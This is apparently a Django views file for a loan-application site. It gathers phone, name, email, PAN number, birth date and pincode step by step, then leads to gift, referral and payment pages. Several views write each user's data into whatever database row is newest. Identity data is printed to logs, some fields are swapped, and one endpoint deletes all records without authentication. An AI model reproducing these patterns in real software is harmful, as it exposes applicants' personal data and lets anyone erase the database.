from django.shortcuts import render,HttpResponse
from loandata.models import loandata

# Create your views here.
def Signup(request):  

    return render(request,"Start.html")
    
def Savephone(request):
    if request.method=="POST":
        phone=request.POST.get('phone')
        en=loandata(phone=phone)
        en.save()

    return render(request,"Tell us.html")
def Mail(request):
    
    return render(request,"CIBIL.html")

def Savemail(request):
    if request.method=="POST":
        new_name=request.POST.get('name')
        newsur_name=request.POST.get('sur_name')
        new_email=request.POST.get('email')
        try:
            new_id=loandata.objects.latest('id')
            print(new_id)
            if new_name is not None:
                new_id.name=new_name
            if newsur_name is not None:
                new_id.sur_name=newsur_name   
            if new_email is not None:
                new_id.email=new_email
            new_id.save()
            return render(request,"CIBIL.html")  
        except:

            return render(request,"Tell us.html")     
def Panpage(request):

    return render(request,"CIBIL.html")
def Pansave(request):
    if request.method=="POST":
        new_pan=request.POST.get('pancard')
        newdob=request.POST.get('date_of_birth')
        new_pin=request.POST.get('pincode')
        print(new_pan,newdob,new_pin)
        # try:
        new_id1=loandata.objects.latest('id')
        print(new_id1)
        print(new_pan)
        print(newdob)
        print(new_pin)
        # if new_pan is not None:
        new_id1.pancard=new_pan
        # if newdob is not None:
        new_id1.date_of_birth=newdob   
        # if new_pin is not None:
        new_id1.pincode=new_pin
        new_id1.save()
        return render(request,"Final.html")  
        # except:
        # print("not send")

        return render(request,"CIBIL.html")




def Notpan(request):
    return render(request,"No PAN.html")
def IfNotpan(request):
    if request.method=="POST":
         
       return render(request,"Final.html")

    return render(request,"No PAN.html")
    

def NoPansave(request):
    if request.method=="POST":
        new_income=request.POST.get('monthly_income')
        new_emp=request.POST.get('empoyement_type')
        new_pin=request.POST.get('pincode')
        print(new_income,new_emp,new_pin)
        try:
            new_id1=loandata.objects.latest('id')
            if new_income is not None:
                new_id1.pancard=new_income
            if new_emp is not None:
                new_id1.date_of_birth=new_emp   
            if new_pin is not None:
                new_id1.pincode=new_pin
            new_id1.save()
            return render(request,"Final.html")  
        except:
            print("not send")

        return render(request,"CIBIL.html")




    
def Gift(request):
    if request.method=="POST":
         
       return render(request,"loan.html")
    return render(request,"Congrats.html")
def Load(request):
    return render(request,"Final.html")

def Inform(request):
    return render(request,"inform.html")
def Inref(request):
    return render(request,"ref.html")



def Ref(request):
    return render(request,"ref.html")
def Refpay(request):
    return render(request,"payment.html")



def Loan(request):
    
        
    return render(request,".html")
def Loanhit(request):
    return render(request,"inform.html")

def Pay(request):
    return render(request,"payment.html")
def Testupi(request):
    return render(request,"testupi.html")




#delete database views
def delete_all_records(request):
    loandata.objects.all().delete()
    return HttpResponse('All records deleted')


